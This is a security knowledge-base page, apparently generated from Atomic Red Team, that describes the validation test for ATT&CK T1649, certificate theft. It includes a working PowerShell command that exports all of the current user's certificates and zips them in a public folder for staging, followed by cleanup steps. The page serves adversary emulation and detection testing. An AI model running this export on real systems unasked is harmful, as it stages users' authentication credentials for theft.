---
atomic_guid: "eb121494-82d1-4148-9e2b-e624e03fbf3d"
title: "Staging Local Certificates via Export-Certificate"
framework: "atomic"
generated: "true"
attack_technique_id: "T1649"
attack_technique_name: "Steal or Forge Authentication Certificates"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1649/T1649.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "eb121494-82d1-4148-9e2b-e624e03fbf3d"
  - "Staging Local Certificates via Export-Certificate"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Staging Local Certificates via Export-Certificate

Export all user certificates and add to a compressed archive.

## Metadata

- Atomic GUID: eb121494-82d1-4148-9e2b-e624e03fbf3d
- Technique: T1649: Steal or Forge Authentication Certificates
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1649/T1649.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1649-steal_or_forge_authentication_certificates|T1649]]

## Executor

- name: powershell

### Command

```powershell
$archive="$env:PUBLIC\T1649\atomic_certs.zip"
$exfilpath="$env:PUBLIC\T1649\certs"
Add-Type -assembly "system.io.compression.filesystem"
Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
mkdir $exfilpath | Out-Null
foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
```

### Cleanup

```powershell
$exfilpath="$env:PUBLIC\T1649\certs"
Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1649/T1649.yaml)
